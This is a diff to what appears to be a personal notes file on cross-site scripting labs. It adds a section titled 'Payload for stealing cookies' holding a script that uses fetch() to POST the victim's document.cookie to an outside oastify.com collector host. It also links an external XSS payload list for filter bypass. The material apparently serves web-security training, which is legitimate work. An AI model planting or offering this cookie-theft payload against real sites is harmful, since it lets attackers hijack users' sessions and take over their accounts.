@@ -7,7 +7,16 @@
 * [Reflected XSS with some SVG markup allowed](#Reflected-XSS-with-some-SVG-markup-allowed)
 * [Reflected XSS in canonical link tag](#Reflected-XSS-in-canonical-link-tag)
 
-
+## Payload for stealing cookies
+```js
+<script>
+fetch('https://m1ofpkz2aozr1riy4z987vbc137uvnjc.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
 #### External source of payloads
 https://github.com/payloadbox/xss-payload-list
 ##### For filter bypass
